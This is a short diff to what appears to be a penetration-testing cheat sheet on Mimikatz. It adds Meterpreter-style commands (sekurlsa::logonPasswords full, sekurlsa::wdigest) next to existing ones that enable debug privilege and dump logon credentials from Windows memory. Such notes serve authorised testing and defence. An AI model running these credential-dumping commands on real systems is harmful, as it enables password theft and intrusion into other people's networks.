@@ -14,6 +14,9 @@ PS C:\temp\mimikatz> .\mimikatz
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
 mimikatz # sekurlsa::wdigest
+
+mimikatz_command -f sekurlsa::logonPasswords full
+mimikatz_command -f sekurlsa::wdigest
 ```
 
 Mimikatz Golden ticket
